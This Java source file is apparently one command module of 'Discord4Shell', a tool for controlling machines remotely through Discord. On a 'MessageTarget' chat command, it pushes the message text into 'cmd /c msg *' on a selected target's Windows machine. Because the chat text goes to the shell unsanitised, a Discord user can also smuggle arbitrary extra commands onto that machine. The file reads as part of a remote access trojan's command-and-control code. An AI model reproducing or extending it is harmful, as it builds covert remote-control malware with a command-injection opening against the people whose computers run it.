package org.example.commands;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Objects;

import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;

public class MessageTargetMessage extends ListenerAdapter {
    public static String Message = null;
    public static ArrayList<String> message = new ArrayList<>();


    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().contains("MessageTarget")) {
            String[] args = event.getMessage().getContentRaw().split(" ");
            int index = 1;
            while (index < args.length) {
                message.add(args[index]);
                index++;
            }

            Message = String.join(" ", message);
            message.clear();





            if(Objects.equals(SelectedTarget, user)) {
                try {
                    Runtime.getRuntime().exec("cmd /c msg * " + Message);
                    message.clear();
                } catch (IOException e) {
                    event.getChannel().sendMessage("Message Not Able To Send").queue();
                }
            }
        }
    }
}